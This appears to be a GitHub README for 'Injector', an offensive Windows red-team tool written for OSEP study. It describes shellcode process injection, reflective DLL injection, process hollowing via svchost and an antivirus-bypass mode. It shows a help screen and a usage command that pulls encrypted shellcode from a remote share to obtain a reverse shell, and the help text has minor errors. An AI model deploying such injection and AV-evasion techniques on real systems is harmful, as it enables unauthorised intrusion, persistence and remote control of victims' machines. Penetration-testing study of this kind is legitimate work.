# Injector
Complete Arsenal of Memory injection and other techniques for red-teaming in Windows

# What does Injector do?

- Process injection support for shellcode located at remote server as well as local storage. Just specify the shellcode file and it will do the rest. It will by default inject into notepad.exe and if not found, it will create a notepad process and inject into it for persistence.

- Reflective DLL Injection for DLL injection. It downloads the DLL and injects into remote process.
- Process hollowing via svchosts.exe
- With -bypass flag it tends to use more advanced un-documented API for process injeciton and the routine itself gets changes.
- Now even supports encrypted shellcode. 

```
C:\Users\admin>Injector.exe
Help Options for Xenon:
-m       Mode of operation
        -m 1     Specifies the mode as Process injection
        -m 2     Specifies the mode as Reflective DLL Injection
        -m 3     Specifies the mode as Process Hollowing

-shellcode       Use shellcode
-dll     Use dll

-encrypt-xor   Specify Xor encryption for shellcode
         -pass   Specifty the password for Xor encryption
-encrypt-aes   Specify Xor encryption for shellcode
         -pass   Specifty the password for aes encryption
-location        Specify the location i.e either server or local
-bypass         Uses enhance attempts to bypass AV
```

To generate encrypted shellcode, use Helper.exe on kali along with proper switch.

### Example of usage

```
Injector.exe -m=1 -shellcode -encrypt-aes -pass=password -location="\\192.x.x.x\share\shellcode.txt" -bypass
```
This is will decrypt your shellcode and give you reverse shell

# Why make it?

Main aim is to help me in OSEP :P

**NOTE: Work in Progress. Some functionality might be broken!**
